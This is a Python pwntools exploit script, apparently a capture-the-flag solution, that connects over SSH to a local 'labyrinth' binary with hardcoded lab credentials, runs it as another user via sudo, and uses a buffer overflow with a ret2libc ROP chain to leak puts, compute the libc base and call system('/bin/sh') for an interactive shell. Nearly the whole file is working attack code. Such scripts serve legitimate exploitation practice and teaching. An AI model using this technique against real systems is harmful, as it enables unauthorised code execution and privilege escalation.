#!/usr/bin/env python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
shell = ssh('entrance', 'localhost',password='Knossos', port=2222)

exe = './labyrinth'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'


io = shell.process(['sudo', '-u', 'minotaur','./labyrinth'])

offset = b'A'*424 #found manually with gdb gef

payload = offset
payload += p64(rop.find_gadget(['ret'])[0]) #Ret instruction is for the stack alignment
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) #Popping the $RDI register for our argument
payload += p64(elf.got.puts) #putting address of gets in $RDI taken from global offset table
payload += p64(elf.plt.puts) #Executing the puts function with loaded argument
payload += p64(elf.symbols.labyrinth) #Returning to the main program with already leaked function


io.recvline();io.recvline();io.recvline();io.recvline();print(io.recvline());
io.sendline(payload) #respond with choice 2

leak = u64(io.recvline().strip().ljust(8,b'\0')) #address(correct one I think)


log.info(f'Gets leak => {hex(leak)}') #info leak
libc.address = leak - libc.symbols.puts #calculating our base address with leaked address
log.info(f'Libc base => {hex(libc.address)}') #info libc base


payload = offset
payload += p64(rop.find_gadget(['ret'])[0]) #Ret instruction is for the stack alignment
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh'))) #filling $RDI with byte string "/bin/sh"
payload += p64(rop.find_gadget(['ret'])[0]) #Ret instruction is for the stack alignment
payload += p64(libc.symbols.system) #executing system function with loaded argument



io.sendlineafter(b'?',payload) #respond with choice 2

io.interactive()